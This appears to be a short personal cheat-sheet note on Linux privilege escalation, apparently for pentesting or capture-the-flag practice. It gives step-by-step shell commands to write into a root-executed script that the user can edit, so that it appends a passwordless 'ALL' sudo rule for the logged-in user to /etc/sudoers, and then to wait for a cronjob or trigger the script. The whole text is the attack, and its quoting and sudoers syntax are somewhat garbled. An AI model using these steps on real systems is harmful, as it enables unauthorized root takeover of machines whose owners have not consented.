==== Editing a file that runs with root to give you root access ====
Editing sudoers with a vulnerable file:
	- echo “#!/bin/sh” > [path to file with root privileges you can edit] (After multiple times editing this file I found that without this initial line I’ll run into an error).
	- echo “sudo echo “[logged in user] ALL=NOPASSWD ALL” >> /etc/sudoers” >> [path to file with root privileges you can edit] (This appends [user] to the sudoers file with the ability to sudo everything once the script runs.
	- Execute action to get file to run (Whether that’s wait till a cronjob runs or you need to execute something you have sudo permissions to and get the script to run).
